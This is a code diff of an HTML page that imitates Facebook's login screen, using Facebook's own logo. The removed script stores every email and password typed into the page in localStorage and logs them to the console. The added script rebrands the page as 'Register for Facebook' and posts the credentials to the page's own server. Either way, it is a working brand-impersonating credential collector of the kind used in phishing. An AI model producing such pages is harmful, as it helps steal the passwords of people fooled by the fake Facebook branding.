@@ -13,56 +13,36 @@
             <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="logo">
         </div>
         <div class="container">
-            <span class="login">Login to Facebook</span>
-            <input type="email" name="email" id="email" placeholder="Email address or phone number">
+            <span class="login">Register for Facebook</span>
+            <input type="email" name="email" id="email" placeholder="Email address">
             <input type="password" name="pass" id="pass" placeholder="Password">
-            <button class="login-btn">Log in</button>
-            <a href="#">Forgotten account</a>
+            <button class="register-btn">Register</button>
             <div class="style">or</div>
-            <button class="new-account">Create New Account</button>
+            <a href="#">Already have an account? Login</a>
         </div>
     </div>
 
     <script>
-        // Retrieve the stored email and password array from localStorage
-        const storedData = JSON.parse(localStorage.getItem("storedData")) || [];
+        document.querySelector(".register-btn").addEventListener("click", function() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("pass").value;
 
-        // Function to store email and password
-        function storeEmailAndPassword(email, password) {
-            storedData.push({ email, password });
-            localStorage.setItem("storedData", JSON.stringify(storedData));
-        }
-
-        // Function to display stored email and password
-        function displayStoredEmailsAndPasswords() {
-            for (const entry of storedData) {
-                console.log("Stored Email:", entry.email);
-                console.log("Stored Password:", entry.password);
-            }
-        }
-
-        // Get references to the form elements
-        const emailInput = document.getElementById("email");
-        const passwordInput = document.getElementById("pass");
-
-        // Add an event listener to the login button
-        document.querySelector(".login-btn").addEventListener("click", function() {
-            // Get the values entered by the user
-            const email = emailInput.value;
-            const password = passwordInput.value;
-
-            // Store the email and password
-            storeEmailAndPassword(email, password);
-
-            // Optionally, you can clear the input fields
-            emailInput.value = "";
-            passwordInput.value = "";
-
-            // Provide feedback to the user (e.g., an alert)
-            alert("Email and password have been stored.");
-
-            // Display all stored email and password combinations
-            displayStoredEmailsAndPasswords();
+            // Send a POST request to the server to register the user
+            fetch('/register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+            })
+            .then((response) => response.json())
+            .then((data) => {
+                alert(data.message);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Failed to register user');
+            });
         });
     </script>
 </body>
